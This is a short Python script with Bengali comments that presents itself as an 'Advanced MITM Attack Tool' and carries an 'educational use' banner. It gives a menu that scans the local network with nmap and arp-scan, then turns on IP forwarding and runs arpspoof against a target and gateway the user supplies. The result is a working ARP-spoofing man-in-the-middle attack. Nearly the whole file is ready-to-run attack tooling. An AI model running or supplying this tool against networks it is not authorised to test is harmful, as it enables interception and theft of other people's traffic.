import os
import subprocess
import time

# সুন্দর ব্যানার ফাংশন
def show_banner():
    os.system('clear')  # স্ক্রিন পরিষ্কার
    print("="*50)
    print("💻  Advanced MITM Attack Tool  💻")
    print("="*50)
    print("🛠️  Created By: [RH Hasan]")
    print("🤝  Team: [ 📿☝️Muslim Army☝️📿]")
    print("📜  For Educational Use Only")
    print("="*50)
    time.sleep(2)

# নেটওয়ার্ক স্ক্যান ফাংশন
def network_scan():
    print("[+] Scanning the network...\n")
    try:
        # Nmap ব্যবহার করে ডিভাইস স্ক্যান
        result = subprocess.check_output(["nmap", "-sn", "192.168.0.0/24"], universal_newlines=True)
        print(result)
    except Exception as e:
        print(f"Error: {e}")

# ডিভাইসের MAC এবং নাম দেখানোর ফাংশন
def detailed_scan():
    print("[+] Performing detailed scan...\n")
    try:
        result = subprocess.check_output(["arp-scan", "-l"], universal_newlines=True)
        print(result)
    except Exception as e:
        print(f"Error: {e}\nPlease install 'arp-scan' first.")

# MITM আক্রমণ ফাংশন
def mitm_attack(target_ip, gateway_ip):
    print("[+] Starting ARP spoofing...\n")
    try:
        os.system(f"echo 1 > /proc/sys/net/ipv4/ip_forward")  # প্যাকেট ফরওয়ার্ডিং চালু
        os.system(f"arpspoof -i wlan0 -t {target_ip} {gateway_ip}")
    except Exception as e:
        print(f"Error: {e}")

# মূল মেনু
if __name__ == "__main__":
    show_banner()  # ব্যানার দেখানো
    while True:
        print("\nChoose an option:")
        print("1. Scan Network")
        print("2. Detailed Network Scan")
        print("3. Start MITM Attack")
        print("4. Exit")
        choice = input("Enter your choice: ")

        if choice == "1":
            network_scan()
        elif choice == "2":
            detailed_scan()
        elif choice == "3":
            target = input("Enter target IP: ")
            gateway = input("Enter gateway IP: ")
            mitm_attack(target, gateway)
        elif choice == "4":
            print("Exiting... Stay safe!")
            break
        else:
            print("Invalid choice. Please try again.")
